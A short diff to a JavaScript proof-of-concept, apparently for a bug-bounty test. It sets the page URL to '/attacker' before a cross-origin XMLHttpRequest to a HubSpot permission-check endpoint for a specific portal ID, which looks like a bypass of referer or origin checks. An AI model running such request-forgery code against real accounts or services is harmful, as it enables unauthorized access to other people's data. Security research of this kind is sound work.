@@ -1,3 +1,4 @@
+window.history.replaceState(null, '', '/attacker');
 var xhr = new XMLHttpRequest();
 
 xhr.open("GET", "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/has-permission?portalId=25502480&callback=jsonpHandler", true);
@@ -14,7 +15,6 @@ xhr.onreadystatechange = function() {
 	var aBody = new Uint8Array(body.length);
 	for (var i = 0; i < aBody.length; i++)
 		aBody[i] = body.charCodeAt(i);
-	window.history.replaceState(null, '', '/attacker');
 	xhr.send(new Blob([aBody]));
     }
 }
